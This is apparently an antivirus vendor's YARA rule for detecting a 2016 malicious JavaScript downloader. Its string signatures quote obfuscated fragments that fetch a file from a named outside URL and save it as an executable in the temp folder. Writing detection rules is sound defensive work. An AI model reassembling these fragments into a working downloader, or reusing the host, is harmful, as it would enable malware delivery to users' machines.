rule sig_20160401_12db792c08cb1d5b095e9043c16b5a9a {
  meta:
    description = "datamaliciousorder - file 20160401_12db792c08cb1d5b095e9043c16b5a9a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2a085ba9a4de775083a9b85a282528f2466fb8fdbbf418ac2e64a29e46beb2ed"

  strings:
    $s1  = "var MmqGoa = function JuZzc() {return WScript[UvBb](\"WScript\"+\".Shell\");}(), IdaDc = 11;" fullword ascii
    $s2  = "function CcGo(YuGvt, SkgBnu){PmdZhj = PmdZhj * 1; return YuGvt - SkgBnu;};" fullword ascii
    $s3  = "AjWfn[KcTa](\"G\" + \"ET\", \"http://toysnet.nl/f9sla\", false);" fullword ascii
    $s4  = "if (AjWfn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = " AjWfn = WScript[UvBb](SeNd);" fullword ascii
    $s6  = "function JdbNk(){return PzRo + \"\";};" fullword ascii
    $s7  = "SeNd[(1, \"S\") + \"aveToFile\"](UcsCsq(), 2);" fullword ascii
    $s8  = "function VunRx() {return ((OmCn == true) && (OmCn == HxKn)) ? 1 : PmdZhj;};" fullword ascii
    $s9  = "function UcsCsq() {return MmqGoa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"syztgzhcAGx.ex\" + \"e\";};" fullword ascii
    $s10 = " SeNd = JdbNk();" fullword ascii
    $s11 = "var OmCn = false;" fullword ascii
    $s12 = "function WlXsk(BesUtk) {var RdBtg = (1, 2, 3, 4, 5, BesUtk); return RdBtg;};" fullword ascii
    $s13 = "SeNd[\"type\"] = WlXsk(1);" fullword ascii
    $s14 = "HxKn = true; " fullword ascii
    $s15 = "SeNd = DcReh;" fullword ascii
    $s16 = "}while (FpJdm);" fullword ascii
    $s17 = "SeNd[\"write\"](AjWfn[\"ResponseBody\"]);" fullword ascii
    $s18 = "return CcGo(EaaVog, EpVv);" fullword ascii
    $s19 = "var TtrYq = new this[\"Date\"]();" fullword ascii
    $s20 = "SeNd[KcTa]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}